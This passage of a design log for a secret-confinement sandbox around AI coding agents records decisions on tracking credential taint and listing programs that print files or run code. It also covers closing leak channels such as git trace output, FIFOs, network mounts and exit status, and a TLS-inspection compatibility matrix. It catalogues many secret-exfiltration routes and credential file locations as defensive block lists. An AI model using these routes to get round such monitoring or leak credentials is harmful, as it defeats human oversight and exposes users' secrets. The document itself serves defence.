| 2026-10-03 | The code-running list by content and its gaps: (5) a binary byte-identical to a code-running program installed on the host (a renamed, pinned `python3` copy) is that program under any name, by the printer scan of (2) generalized (`program-hashes.ts`, `hashRunsCode`); (6) the ftp clients, `aria2c` (`--on-download-*`), `lftp`, `sftp`, `wget`/`wget2` (`--use-askpass`), `rclone`, `gio`, `kioclient*`, the text browsers, httpie, more editors and more launchers join the list in its three copies; (7) `vim -c` and modelines verified closed since !368. Chosen over a guard-side hash (the socket's readers are named, never pinned by hash) and over a per-option rule for the fetchers (their rc files in `$HOME` set the same hooks). Cost: a renamed copy of an installed interpreter reads nothing; the ftp clients read nothing raw; a quarter second more at the arbiter's first scan | §3 D8 |
| 2026-10-04 | (9) Programs that print a file through an option join the printer list: `file -f`, `date -f`, `wc`/`du --files0-from`, `logger`, `ssh-keyscan`, the typesetters and manual-page tools, the compilers, assemblers, linkers and binutils (`cc -E`, `@file` response files, `objcopy -I binary`), the parser generators and gettext's catalog tools, in the three copies. Chosen over an allow-list of leaf readers (it would refuse every leaf the human names) and over per-option rules (`file` without `-f`), as for the fetchers. Cost: those programs as a file's reader give no raw byte | §3 D8 |
| 2026-10-04 | (10) Build tools and more runtimes join the code-running list (`cmake`, `ctest`, `ninja`, `go`, `cargo`, `run-parts`, the TeX engines, …), and both lists match a name without a trailing version (`php8.5`, `gcc-15`). `cargo` and `npm` are listed although consumer-table programs: they run the package's code; `cargo` reads its credentials as the twin, as `node` reads `.npmrc`. Chosen over keeping the consumers off the list (a token held by the agent's `build.rs`) and over the allow-list design (the maintainer's call). Cost: `cargo publish` without the wire release fails its login | §3 D8 |
| 2026-10-04 | (8) continued: the interpreter families the content scan left out get markers of their own (ksh93, mksh and lksh, posh, yash, tcsh, BSD csh, fish, toybox, LuaJIT, guile, Racket CS, R and littler, julia, bun, deno, PowerShell's apphost), each the front end's own text or entry import, checked against the distribution's build and an older or upstream one; the shared `set -o` header goes last so a ksh is named for itself; the scan searches a 256 KiB window at a time with every marker (36 markers in the time 15 took). Chosen over sonames and embedding symbols as in (8), and over a multi-pattern crate (the CI image builds offline). Cost: `bun build --compile` programs (Claude Code's native binary among them: its own protected writes asked per run), deno 1.x compiled programs, `raco exe` programs and `fish_indent` are no readers; littler's `r`, on no name list, is now known by content. Not covered: Racket BC, julia before 1.6, oksh, elvish, nushell, the `dotnet` muxer | §3 D8 |
| 2026-10-04 | (11) `git` is a printer (§4.9 option (a), the maintainer's decision): `git diff --no-index`, `git grep --no-index`, `git config -f` print any named file. With it `git-credential-store` (git itself), git's HTTP transport `git-remote-http(s)/-ftp(s)` (it opens `.netrc` and prints its header under `GIT_TRACE_CURL` + `GIT_TRACE_REDACT=0`), and every builtin by its hash (git's exec path scanned), in the three copies. A consumer-table printer keeps the wire release's twin; `ssh` (and `{ app: ssh, from: git }`) still reads the keys. Chosen over admitting git per subcommand (a grammar to keep current), over admitting it only for its own files (`git diff --no-index` of `.git-credentials` stays open) and over accepting. Cost: without TLS inspection an HTTPS login from `.git-credentials` or `.netrc` fails | §3 D8, §4.9, §10.3 |
| 2026-10-04 | (12) The allow-list: raw bytes only to a vetted reader (`psql`, `pg_dump`, `pg_restore`, `ssh`, `ssh-add`: probed, or the maintainer's word) or to an entry carrying `prints: nothing`, the human's word, independent of `output:`; every other program the twin, held with a warning under `ask: always` (verdict kind `trust:`, old `open:` answers not counted) (`git` a printer since (11)). Chosen over growing the block-lists (never done) and over counting any pin as a vouch (Mandu writes pins too, and cannot tell them apart in an older law). Cost: the cloud CLIs, `git` and every unvetted program read the twin unless the wire release serves it or the human writes the field | §3 D8, §4.9 |
| 2026-10-04 | (12) correction: `psql`, `pg_dump`, `pg_restore` leave `VETTED_READERS` (listed unprobed; the rule is "probed not to print"). Probed then: `psql` (`-f`, `\i` and `\copy … from` on its stdin print a file; it runs `\!`) and `pg_restore` (writes a dump out as SQL) are printers in the three copies; `pg_dump` is neither (reads the twin unless vouched for). Cost: a Postgres login from `.pgpass` fails under Mandu (no wire release for Postgres) | §3 D8 |
| 2026-10-07 | (11) continued: git's separately built `git-http-fetch`, `git-http-push`, `git-imap-send` (libcurl reads `.netrc` for them; `GIT_TRACE_CURL` prints the login) and `git-http-backend` (sends a file its request names) join the printers in the three copies, so the hash scan of git's exec path picks up the installed binaries; `git-http-fetch` and `git-http-push` join `.netrc`'s consumer row (the wire twin). Red before: `{ app: git-http-fetch, prints: nothing }` read `.netrc` raw under every `ask` mode. Chosen over a `git-` prefix class (it would name `git-lfs` and other non-git programs) and over the scan hashing every file in git's exec path as git (they are not git). Cost: none for a working setup (a dumb-HTTP fetch or push still logs in through the wire twin) | §3 D8 |
| 2026-10-07 | P0 1b: a holder's `memfd_create` is performed by the guard and the new object marked before the descriptor is handed over (the open path's rule); everyone else's continues. Chosen over refusing memfds to holders (JIT runtimes use them) and over sweeping the holder's table again at its next event (the sharer may read first). The memfd is made in the guard's pid namespace, so the guard's `vm.memfd_noexec` applies. Pinned with it: an `O_TMPFILE` a non-holder holds when a holder writes it (2c, closed by the taint-time sweep). Cost: one trapped call per `memfd_create` under a secret policy, answered at once while nobody holds a secret | §4.5.1 |
| 2026-10-07 | P0 2d: "out of reach" (`exeSystem`, a script pin's `system`, a trusted ancestor) reads ACLs and capabilities, failing closed: any POSIX ACL beyond the base entries, a default ACL on a directory, any NFSv4 ACL or an unreadable one puts the inode in reach whatever its entries name; any capability that overrides file permissions (every one but network, scheduling, clock, lease, audit and wake-alarm) in the initial namespace puts every file in reach. Chosen over evaluating the ACL against the agent's uid and groups (a mask, a group the agent joins later, an NFSv4 ACL's semantics: more code, more to get wrong) and over a denylist of capabilities (a capability a later kernel adds would count as harmless). Cost: a binary under an ACL or on NFSv4 is never out of reach (its bare-name pin is asked about); two or three `getxattr` per path component | §3 D8 |
| 2026-10-07 | D9, the gates' human verdicts: a data-socket ask of `desymbolizationDecision`, `fsPathDecision`, `escalateExec` or the program-text gate no longer spends (nor is granted) a human's *Allow once*; a *once* denial is read unspent. The net-proxy and the Claude proxy's network and path gates ask on the human socket first (two changes, callers then the arbiter). Chosen: an approval read as no verdict over one answered unspent (which a gate left on the data socket would take as standing). `declassifySymbol` still spends from the data socket (its caller is in the agent's tree). Cost: none with a human client | §3 D9 |
| 2026-10-07 | D9 follow-up: a WebFetch's *Allow once* was spent by the model proxy's tool_use pre-check, so the net-proxy's real send was held again. The pre-check now asks with `preflight`: an approval is read unspent, a denial spent; the send on the wire spends the approval. Chosen over a shared ask id (no correlation the fetch carries); the pre-check releases nothing itself | §3 D9 |
| 2026-10-07 | A blind tunnel's chunks are judged by the holders at the `CONNECT` and every process holding the socket now that holds a secret: the arbiter lists the processes it holds secret taint for (`secretTaintedProcesses`, the forward image of the taint walk, kept until the database changes) and the proxy reads only their descriptor tables and their live descendants'. Chosen over a timed rate limit on the full rescan (a chunk passes unjudged inside the window), over asking about the frozen holders' recorded descendants (misses an `SCM_RIGHTS` receiver; refuses a tunnel for an exec'd child that does not hold the socket) and over the full rescan per chunk (20 to 70 ms a chunk). Cost: under 0.5 ms a chunk beyond the one question before; the full rescan when the arbiter cannot list | §3 D6 |
| 2026-10-07 | (13) Programs known by name only (P0 item 14): the content scan names elvish, nushell, the .NET muxer, Racket BC, julia before 1.6 and the pdksh line; a binary neither list names whose content is a program of a package of printers or launchers (GNU coreutils, findutils, util-linux, diffutils, sed, grep, tar; coreutils' checksum tools excepted) is a printer (`pkg:`); an out-of-reach `from:` parent is read for its content; .NET's code-loading variables are loader variables of every program; the rule list shows the arbiter's per-entry judgment; `nu`, `oksh`, `loksh`, `pdksh`, `racketbc`, `racketcs` join the list. Chosen over a fingerprint of "can run code" (imports of `execve` or `system`: every vetted reader and consumer has them) and over per-program usage lines for every printer (a table as long as the name list, a block-list again): a package's own text is one marker per package, fail-closed, with the one leaf the tests and examples name excepted. Cost: such a build reads nothing raw even vouched for; a root-installed `from:` parent is read once | §3 D8 (13) |
| 2026-10-07 | (11) continued, the maintainer's decision: the `git-credential-` prefix class (`PRINTER_NAME_PREFIXES`, three copies): every program named `git-credential-<something>` is a printer (a credential helper prints `password=` on `get`), and so is a script so named (`{ app: perl, script: …/git-credential-netrc }` admits nothing; perl running it is no reader; an answer about the pair applies to nothing). Red before: `{ app: git-credential-libsecret, prints: nothing }` read a labelled file raw. Chosen over naming the known helpers one by one (a third party's is not on any list). Cost: a helper named as a reader of a labelled file gets the twin, or the refusal | §3 D8 |
| 2026-10-07 | Lookups and read offsets on a network or FUSE mount (the maintainer's "refuse raw if visible"): the guard answers a raw open with the twin while a mount that sees lookups (every network and FUSE type, an automount point; not a hypervisor's or WSL's host share) is visible in the opener's mount namespace, unbound and not trusted in policy.yaml `remote_mounts.trust_lookups` (by mount point and type, a relaxation); unreadable or unanswered ⇒ the twin. Enforced in the guard at the raw open, the table kept per namespace and re-read on a `mountinfo` poll; the launcher and `mandu doctor` name the mounts. Chosen over hiding such mounts from holders (a mount namespace per holder, or unmounting them from the agent's world, which takes the user's files away from every program). Cost: no real file for readers on an NFS or sshfs home, or a desktop with `gvfsd-fuse`, until trusted or bound | §4.6, §4.9 |
| 2026-10-09 | P0 5d, an overlay's upper shadowed from the tree's own user namespace: a stacking mount's `upperdir=` (or source) is followed only when its superblock is mounted in the guard's own mount namespace (its row found there by `mnt_id`, or a row there with the same `major:minor` and type; `local_exits::stack_known`), and there the directory must resolve in the guard's own view (`lands_of`); a stack only a namespace of the tree's own holds is `Lands::Foreign`, remote, named `mount:<fstype>:<source>` of the stack itself. Cost: a holder writes through an overlay the agent's own programs mounted only once bound to that overlay, even over a local upper. Left: a tree with `CAP_SYS_ADMIN` over the guard's namespace; lookups through an overlay whose remote upper's mount is out of the reader's view. Kernel test (O2), and (O)'s unfound upper the tree laid a local directory at | §4.6 |
| 2026-10-09 | P0 2b: a pipe, a socket pair, or a FIFO opened before the taint whose receiving end a process OUTSIDE the guard's tree holds refuses the event (the raw open at the sweep, a pass to a holder, a holder's `sendmsg` on the pair); the human plane (the guard's own stdio, handed to the tree) is left out; an unreadable table (another user's, a non-dumpable process) is not seen, as for the FIFO rule. Chosen over making the outside process a holder (the guard confines only its tree) and over trapping `write` (every write of every process). Cost: one `/proc` scan (~11 ms on a 1,600-process host) per taint, and per socket pair a holder `sendmsg`s on at most once a second | §4.5.1 |
| 2026-10-09 | D7, Claude Code's polls: a `BashOutput` / `TaskOutput` poll takes the process leg of the ONE `Bash` call with `run_in_background: true` whose result starts with Claude Code's announcement of the polled id, when no other result of the request claims that id; anything else is the session's, as before. Chosen over a poll-to-call record kept across requests (the history re-sent each turn carries the announcement; a compacted one is the session's) and over binding a poll to the newest background call (a guess). Gain: a clean background task's polls are no longer masked while the session holds a raw read | §3 D7, Plan 10 §11.12 |
| 2026-10-09 | D7, Codex under its own sandbox: the sandbox helper (the agent's child) is a candidate root for the ONE command shell its plumbing (the helper, bwrap) started, read down the guard's own lineage edges; two command shells of different text make the helper no candidate. Chosen over binding by the helper's own argv (cut inside the preamble, it never carries the command) and over taking the newest shell under the helper (an orphan of the command could exec one). Gain: a clean sandboxed Codex call is no longer masked while the session holds a raw read | §3 D7 |
| 2026-10-09 | D7, a background poll as evidence: the proxy's ask for a tied poll names the poll (`forPoll`, human plane), and the poll's row counts in the value backstop by the tied call's tree. Chosen over counting every BashOutput row (a precautionary row would mask its own text forever) and over minting the poll's symbol under the call's id (the row's call id is its provenance elsewhere) | §3 D7 |
| 2026-10-09 | The agent is exactly the first-started process of `agentExe` (by image or interpreter script), never a child taken on trust; an npm wrapper script that runs the real binary is resolved by the launch to that binary (`npmWrappedNative`). Chosen over keeping the guard's first-child rule with a cache that waits for the child (a set first asked after an in-process agent such as OpenClaw had started a tool's shell or an MCP server would exempt it) and over naming every child of the script. Fixes npm's Codex, which was never the agent and became a holder on the first raw read | §4.5.1 |
| 2026-10-09 | A same-user non-dumpable process (ssh-agent, gpg-agent) beside a reader inside, on a holder's FIFO, pipe or tunnel, stays NOT seen and disclosed (`docs/guarantees.md`). Chosen over counting every unreadable descriptor table as a reader, which would refuse every holder FIFO write while ssh-agent or gpg-agent runs (on most developer hosts), and over exempting the two by identity (a non-dumpable process's `exe` is unreadable too; its `comm` is the process's own to set). The maintainer's decision | §4.5.1 |
| 2026-10-17 | D7, the store clock across a restart (security fix): a new provenance store starts its clock at the newest stamp it holds, each stamp max(wall, last + step); the panel's time of a read is kept apart (`wall_at`). Chosen over a persisted high-water row written per stamp (a write per record on the hot path; the records already carry it) and over a monotonic-clock offset (`process.hrtime` resets with the process, and only the stored stamps say where the last one stood). Cost: one MAX per stamp column at start; after a large backward step the stamps sit above the wall clock until it catches up | §3 D7 |
| 2026-10-17 | `from:` parents are the opener's ancestors inside the session only (security fix): the guard's walk stops below the guard and gives none when the chain does not reach it (re-parented, unreadable, a reused number). Chosen over stopping at the agent's own process (`agentExe`: unknown without it, and the wrappers between the guard and the agent are the launch's own) and over keeping the reader's nearest parent when the chain is unanchored (that parent can be the subreaper above the guard). Cost: a reader re-parented to the guard loses its `from:` parent; a `from:` naming the program that launched Mandu admits nothing | §3 D8 |

## 9. Review of the revision (2026-10-01): what §4 still does not cover

A reading of the revised §4 against its own question, drawn in
[`figures/reader-set-labels.html`](./figures/reader-set-labels.html) Figures
10 to 15. Each finding names the §7 step it changes and its status now.

| # | Finding | Figure | Answer | Status |
|---|---|---|---|---|
| R1 | **The reader that already holds the descriptor.** A tree left running by an earlier call (`tail -f /tmp/x \| curl … &`) has a file open for reading; a later call reads `.env` raw and appends to it. §4.5 re-judged the writer's sinks only; the reader's `read(2)` is no event and its connection was opened before the label existed. Same shape: a listener or AF_UNIX peer from an earlier call, a FIFO, `/dev/shm`. | 10 | A file taking a label is a source event for every process holding it open for reading; a channel joined after the taint makes the other side a holder | **Built** (§4.5.1: socket shapes, file shapes, the agent's own connection masked, its leftovers closed) |
| R2 | ***Always* on a row with several sources.** §5.4's *Always* would add the destination to every source, including the one whose label said "nowhere", and the row did not say which source blocks. | 11 | One *Always* per source, each its own human-plane `PolicyEdit`; the row names the blocking source | **Built** 2026-10-11 (§5.4) |
| R3 | **The session holder's intersection.** After two in-context reads of `any-model` files with different bindings, the session can deliver nowhere without an ask, and nothing showed the session's label. And D1 had a session twin: `SessionLabels.raise` unioned bindings. | 12 | `raise` intersects bindings and keeps `max(level)`; the product page shows the session's label; a rung 3 read that would empty it asks first | Intersection **built** (step 4); the display and the ask left (step 10) |
| R4 | **The boundary of §4.9, and exits not named.** File names are the excluded channel with unbounded capacity; the exit status rode beside a masked result; network and FUSE mounts, another local user, the display server socket and device nodes had no disposition. | 13 | The exit status closed; names accepted for vetted readers only (printers admit nothing); mounts and the display socket as destinations, device nodes in §4.9 | Exit status **built**; names **decided** (§3 D8: printers, fetchers and host printers' copies admit nothing; `git` open, §4.9); part (b) **built** 2026-10-03: mounts as destinations, a holder's files closed to other users, device nodes refused, the display socket confirmed a destination (§4.6, §4.9); its leftovers **built** 2026-10-04: an overlay by its upper layer, a holder's names and attributes on a mount, a writable descriptor passed over `SCM_RIGHTS` (§4.6); synced folders left (step 12) |
| R5 | **Three smaller.** §4.8's opt-out named no plane (an injected agent could perform it); an interpreter opener was only warned about; layer 0 ships "no bindings" although the canonical hosts (`*.amazonaws.com`, `github.com`, `registry.npmjs.org`) are as fixed as the consumers. | 14 | The opt-out is a human-plane act; an interpreter is pinned with its script; catalog rows with a canonical host carry `bindings` | Script pin **built** (§3 D8); the opt-out is Plan 15's "let it through" on the human plane; canonical catalog bindings left |

### 9.1 How to address each finding

Figure 15 has the full table (mechanism, decision, tests that must fail on the
code before, step). The current state of each:

- **R1.** No reverse index is kept: the guard reads the tree's descriptor
  tables and mappings at the taint, at a holder's write-open or `shmat`, at a
  pass and at a later open of a marked object, as the sweep does for sockets
  (§4.5.1). Tests: `object_flow_integration.rs`, `socket_flow_integration.rs`,
  `agent_flow_integration.rs`, `tests/sandbox/guard/socket-flow.test.ts`,
  `agent-flow.test.ts`.
- **R2.** One *Always* per source in §5.4's row, each a `lock-path` edit of
  that source's rule through `policyPropose` approved by the click. *Built*
  (2026-10-11, §5.4), with the two tests: one source answered still
  refuses; `policy.yaml` gains one binding per answered source and nothing
  on the other.
- **R3.** `raise` intersects (built; a test of two disjoint binding sets
  yielding ∅). Left: `/api/home` showing the session's label with the
  declassified files; `declassify_symbol` asking first when the read would
  empty the session's destinations.
- **R4.** The exit status, built in two halves. *The model side:* every
  result the proxies mask as secret carries `is_error: false`
  (`anthropic-proxy` `rewrite-request.ts`), and a kept Codex runtime header is
  blanked (`openai-proxy` `blankRunFacts`: exit code 0, status `completed`,
  wall time 0, no token count; a cell still `running` or `yielded` keeps that
  word so the model collects the rest). *The process side*
  (`net-supervisor` `wait_flow`, `guard_wait`): at the taint, the sweep makes
  the new holder's parent and tracer holders flowing from it, up to the
  agent's own child (covering a wait already blocking and a `siginfo` with no
  wait); at the wait, `wait4` and `waitid` reach the guard under a secret
  policy, and a waiter that may reap a holder is made one before the kernel
  performs the wait (judged, then `CONTINUE`; killed when its sweep refuses).
  Never the agent or above it. Tests: both proxies' `rewrite-request` tests,
  `tests/stack/masked-result-run-facts.test.ts`, the kernel
  `wait_status_integration.rs` (with controls for shells, `make`, Python's
  `subprocess` and Node's `child_process`). The names half was decided the
  other way: printers admit nothing (§3 D8). *Part (b), the exits that are
  paths* (built 2026-10-03, §4.6 and §4.9): the guard's write-open (the
  performed open, before the create and again after the open) and the
  taint-time sweep judge a holder's write onto a network or FUSE mount
  (`mount:<fstype>:<source>`, refused unless bound), into a device (refused
  but for the terminal and the sinks that keep nothing), and into a file
  other users could read (narrowed to no group or other bits, or refused);
  the mode and attribute families are trapped under every secret policy, so
  a derived file is never reopened to others; the arbiter's binding join
  compares a `mount:` binding by equality (`bindingCovers`). The display
  socket was already a Unix destination. Tests: `net-supervisor`
  `local_exits.rs` unit tests and `guard_filter.rs`, kernel
  `local_exits_integration.rs` (each case with its control: the mount bound
  and unbound, a non-holder's file and chmod, a non-holder's `/dev/fuse`, a
  non-holder's display connect), `arbiter`
  `holder-bindings-intersection.test.ts`, and the live
  `launcher/test/derived-label-live.test.sh` (the real guard and arbiter: the
  copy is `0600`, a later `chmod 644` refused). Its three leftovers (built
  2026-10-04, §4.6): an overlay (eCryptfs, shiftfs) is judged by the mount
  its writes land on (`local_exits::stacking`); a holder's names and
  attributes on such a mount (the name family, now trapped under every
  secret policy with `mkdir`; the owner and timestamp families and `bind`
  since 2026-10-07) are refused unless bound
  (`guard_kernel::holder_change_refused`); a writable descriptor of a file
  there, or of a device, passed to a holder refuses the send
  (`guard_rights::passed_exit`). Tests: the same unit files and
  `secret_open.rs` and `owner_time.rs`, kernel `local_exits_integration.rs`
  (O), (N), (R), (B), (T), each
  with its control, and `derived-label-live.test.sh` (1c): a holder's and a
  non-holder's `mkdir`, `mv` and `ln -s` on a local disk still run. Its
  lookups and read offsets (built 2026-10-07, §4.6): a raw open is answered
  with the twin while an unbound mount that sees lookups, not trusted in
  policy.yaml `remote_mounts.trust_lookups`, is visible to the opener
  (`guard_kernel::raw_withheld_by_visible_mount`, `visible_mounts.rs`).
  Tests: kernel `local_exits_integration.rs` (V), the unit and stack files
  §4.6 names.
- **R5.** The `(interpreter, script)` pin and decisions (b) and (c) are built
  (§3 D8). Left: the catalog's canonical bindings (a test: the AWS symbol
  releases at `*.amazonaws.com` with no `policy.yaml`).

## 10. Which clients the wire release serves (TLS-inspection compatibility)

Measured 2026-09-25; a companion to
[`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
§11.5 (the wire release) and §11.3 (the consumer table). Status: **BUILT.**

### 10.1 What depends on this

In `secrets` mode the agent's world holds placeholders. A placeholder is turned
back into the real value only by the egress proxy, inside a request to a host
the secret is bound to, and over HTTPS only if the proxy can read the request
(TLS inspection with a per-session CA). So a program's placeholder reaches its
server intact only if the program

1. sends its HTTPS through the proxy (honors `HTTPS_PROXY`), and
2. trusts the session CA (honors one of the CA variables the launcher sets).

A program that fails either is not a leak: it only ever held a placeholder,
and the server rejects it. It is a **utility** failure, and the fix is to make
the program a reader of the file (it then holds the bytes, and every exit is
confined, Plan 10 §3). This matters most for environment-variable secrets,
which are placeholder-only (Plan 10 §11.4): the wire release is their only
path.

### 10.2 The matrix

Measured by `tests/env/tls-compat.test.ts` (opt-in:
`MANDU_LIVE_TLS_COMPAT=1`; an `env` suite run nightly in a networked guest,
test-reorganization.md §8): the real net-proxy with inspection, the
launcher's own variables (`mitmTrustEnv`, `writeCaBundle`,
`NODE_USE_ENV_PROXY`), each client fetching a public HTTPS page. **Served**:
through the proxy, trusted the CA. **Bypass**: never used the proxy.
**Refused**: reached the proxy, rejected its certificate. Rows marked *doc* are
from the vendor's documentation, not measured.

| Client | Cell | What it needs | Source |
|---|---|---|---|
| curl | served | `CURL_CA_BUNDLE` | measured |
| wget (OpenSSL build, `+ssl/openssl`: Ubuntu 24.04's 1.21) | served | `SSL_CERT_FILE` | measured |
| wget (GnuTLS build, `+ssl/gnutls`: Ubuntu 26.04's 1.25) | **refused** (`tls_rejected`) | reads only the system store, not `SSL_CERT_FILE` | measured |
| git (https) | served | `GIT_SSL_CAINFO` | measured |
| Python `urllib` | served | `SSL_CERT_FILE` | measured |
| Python `requests`, pip, twine | served | `REQUESTS_CA_BUNDLE` | measured (requests, pip) |
| Node `fetch` | served on Node ≥ 22.21 (22 line) or ≥ 24.0; **bypass** before | `NODE_EXTRA_CA_CERTS` + `NODE_USE_ENV_PROXY=1` | measured (22.13, 22.22, 24.21) |
| Node `https` / `http` | served on Node ≥ 22.21 (22 line) or ≥ 24.5; **bypass** before | `NODE_EXTRA_CA_CERTS` + `NODE_USE_ENV_PROXY=1` | measured (22.13, 22.22, 24.21) |
| npm | served on every Node | `NODE_EXTRA_CA_CERTS`; npm reads the proxy variables itself | measured |
| Node without `NODE_USE_ENV_PROXY` | **bypass** | Node ignores the proxy variables unless told to | measured |
| Bun `fetch` | served | `NODE_EXTRA_CA_CERTS` | measured |
| Go `net/http` (gh, terraform, most CLIs in Go) | served | `SSL_CERT_FILE` | measured |
| Ruby `Net::HTTP` | served | `SSL_CERT_FILE` | measured |
| cargo | served | `CARGO_HTTP_CAINFO` | measured |
| cargo without `CARGO_HTTP_CAINFO` | served (rustup's cargo); **refused** by a cargo whose libcurl ignores `SSL_CERT_FILE` | rustup's cargo vendors libcurl over OpenSSL with no CA file of its own, so OpenSSL's default paths (`SSL_CERT_FILE`) apply; a cargo linked to a GnuTLS libcurl (or a system one with a compiled-in CA bundle) does not read it | measured (rustup 1.75) |
| Java (`HttpClient`, `HttpsURLConnection`) | **bypass** | reads no proxy or CA variable; would need `-Dhttps.proxyHost`/`-Djavax.net.ssl.trustStore` with a PKCS12 store | measured |
| aws CLI / botocore | served for bearer calls | `AWS_CA_BUNDLE` | doc |
| gcloud | served | `CLOUDSDK_CORE_CUSTOM_CA_CERTS_FILE` | doc |
| az | served | `REQUESTS_CA_BUNDLE` | doc |
| kubectl, helm (to the cluster) | **refused** | trusts only the kubeconfig's cluster CA | doc |
| docker pull/push | **not in session** | the daemon makes the request | doc |

**Your own CA files are kept** (Plan 12 F6). Each client reads one file from
its variable, so setting it to the session's file would drop a corporate CA
the user had given it. When a trust variable above is already set to a
readable PEM file, the session hands that variable a copy of the user's file
with the session CA appended (`writeUserTrustFiles`, net-proxy.ts). A variable
the user did not set keeps the table's value.

Go and Ruby never proxy a loopback address, so a test upstream on
`127.0.0.x` makes them look like bypass; the matrix is measured against a
public host for that reason.

**Cells that follow the installed client** (re-measured 2026-10-09, the
first nightly run in the CI guest). Three rows depend on what is installed,
not on Mandu, and the test derives their expectation from the client's own
version text (`tests/lib/tls-compat-cells.ts`, unit-tested in
`tests/stack/tls-compat-cells.test.ts`) instead of hard-coding one host's
answer:

- **Node.** Node's docs date `NODE_USE_ENV_PROXY` v24.0.0 and v22.21.0 for
  `fetch`, and the built-in proxy support of the `http`/`https` global agent
  v24.5.0 and v22.21.0; 23.x never had it. The test runs the `node` on `PATH`
  (what a program in a session runs) and, where the CI image has it, the
  newer node the agent CLIs run on (`/opt/agent-node`), so both cells are
  measured on every nightly.
- **wget** by its TLS library (`wget --version`: `+ssl/openssl` or
  `+ssl/gnutls`).
- **cargo without `CARGO_HTTP_CAINFO`** by its libcurl (`cargo -vV`: a
  `vendored ssl:OpenSSL` libcurl is served, `ssl:GnuTLS` refused); a build the
  helper cannot place (a system OpenSSL libcurl) is declared build-dependent:
  served or refused both pass, bypass still fails.

The test also drops `CARGO_NET_OFFLINE`, which the CI guest sets for its
whole pipeline (offline cargo never dials and reads as bypass), prints each
row's events with their reasons, the client's version and the proxy log, and
retries once a row whose only event is `forward_error` (the upstream was
unreachable: transport, not a cell).

**Utility gap on Mandu's floor Node.** Mandu supports Node 22.13
(`scripts/ci/pins.env` `NODE_VERSION`), which predates `NODE_USE_ENV_PROXY`:
on it a Node program in the session (`fetch`, `https`) silently goes around
the egress proxy, so a placeholder it sends is never put back and its login
fails. Nothing leaks (it only ever held the placeholder, and a request that
goes around the proxy carries the placeholder, guarantees.md §2); npm is not
affected (it reads the proxy variables itself). **Warned since
2026-10-09**: `mandu doctor` names the `node` first on the user's PATH (what
a program in a session runs) with a ✗ row, the version, what does not work
and the upgrade (22.21+ or 24.5+) when it predates the variable for `fetch`
or for `http`/`https`, and a launch that inspects TLS prints the same as one
`mandu: ! …` notice line; one version table, `launcher/src/node-floor.ts`
`nodeHonorsEnvProxy`, which `tests/lib/tls-compat-cells.ts` re-exports
(packaging.md §7). The same gap applies to a GnuTLS wget (refused, so its
placeholder never reaches a server either), which nothing warns about yet.

### 10.3 The consumer table

`arbiter/policy/flow-taint.ts` `CONSUMER_TABLE` carries a `wire` verdict per
row (`consumerWireRelease(path)`), with the reason:

| File | Consumers | Wire | Why |
|---|---|---|---|
| `~/.config/gh/hosts.yml` | gh | served | Go; bearer header |
| `.npmrc` | npm, yarn, pnpm, node | served | Node with `NODE_USE_ENV_PROXY`; bearer header. The consumers read the twin when every token is a registry-scoped `_authToken`/`_auth` (bound to that registry), or a registry-scoped `username` + `_password` (npm sends the twin's base64 inside Basic and the proxy decodes the pair and puts the password back), and the session inspects TLS; measured on npm 9.2, 10.9 and 11.21 against a fake registry (Plan 10 §11.13.1) |
| `pip.conf` (`~/.config/pip`, `~/.pip`), `PIP_INDEX_URL` | pip (as `python3`) | served | requests/urllib3 with `REQUESTS_CA_BUNDLE` / `SSL_CERT_FILE`; basic auth. Not a table row (python is never a reader): pip reads the twin, whose index URL holds the percent-encoded token, and the proxy puts the password back inside Basic at the index host (Plan 10 §11.13.1); measured with pip 25.1.1 on Python 3.14 |
| `.netrc` | curl, git, git-remote-http, git-remote-https, git-http-fetch, git-http-push | served | basic auth header (git's opener of the file is its HTTP transport `git-remote-http(s)`, on the row since 2026-10-04, and for a dumb-HTTP remote the `git-http-fetch` / `git-http-push` it starts, since 2026-10-07; all are printers and read the twin; `git-imap-send`, a printer that reads it too, speaks IMAP and is not on the row) |
| `~/.git-credentials`, `~/.config/git/credentials` | git, git-credential-store | served | basic auth header (Plan 10 §11.13) |
| `.pypirc` | twine | served | requests |
| `~/.cargo/credentials.toml` | cargo | served | `CARGO_HTTP_CAINFO` |
| `.pgpass` | psql, pg_dump, pg_restore | reader | Postgres protocol, not HTTP |
| `~/.aws/credentials` | aws | reader | SigV4 signs with the secret: a placeholder cannot be put back after signing |
| `~/.docker/config.json` | docker | reader | the daemon, outside the session, makes the requests |
| `~/.kube/config` | kubectl, helm | reader | pins the cluster CA |
| `~/.ssh/id_*` | ssh, git, scp, ssh-add | reader | SSH, and the key signs |

Since 2026-10-04 (§3 D8 (12)) only the vetted ones (`ssh`, `ssh-add`) read
their file raw by default; the others read the twin, which logs in where the
wire release serves it (`psql` and `pg_restore` are printers since that
day's correction, and `.pgpass` has no wire release: Postgres logins from it
fail). Before, the
table's consumers read the file raw by default (rule i); the `wire` field
records which of them *could* instead work from a twin, the data a "prefer the
twin" default needs. Exception: `curl` and `scp` are printers since §3 D8's
leftover (1), and `git` and `git-credential-store` since 2026-10-04 (§3 D8
(11)), and never read raw; `curl` and `git` still get `.netrc`'s and
`.git-credentials`' twin under the wire release, and `ssh` (which `scp`
and `git` start) opens the key.

### 10.4 What the launcher and proxy do

- **Launcher** (`env-compose.ts`): `mitmTrustEnv` is the one list of trust
  variables, including `CARGO_HTTP_CAINFO`, `AWS_CA_BUNDLE` and
  `CLOUDSDK_CORE_CUSTOM_CA_CERTS_FILE` (all get the combined system + session
  bundle, never the session CA alone). With the egress proxy on,
  `NODE_USE_ENV_PROXY=1`, and `--disable-warning=UNDICI-EHPA` appended to the
  user's `NODE_OPTIONS` when the agent's `node` accepts it (20.11+ / 21.3+; an
  older Node refuses to start with it), so Node does not print an
  "experimental" warning into every tool result. Claude Code runs unchanged
  under both.
- **net-proxy** (`mitm.ts`): a `tls_rejected` event when a client does not
  finish the handshake, naming the host and the way out; a 10 s handshake
  deadline stops a given-up connection from holding its sockets.
- **Live checks**: the matrix test, and a Node `fetch` leg in
  `launcher/test/wire-release-live.test.sh` (a placeholder sent by Node gets
  the real value put back at the bound host).

### 10.5 Not done

- **Java** stays a reader. Serving it needs a PKCS12 trust store generated per
  session (`keytool`, a JVM start at launch) and `JAVA_TOOL_OPTIONS`, which
  every JVM echoes to stderr.
- **A per-host inspection opt-out** for pinning clients: today
  `MANDU_MODEL_HOSTS` both excludes a host from the proxy (`NO_PROXY`) and
  passes it through uninspected, but the connect guard then decides the
  direct connection (a cluster on `:6443` needs a `destinations:` rule).
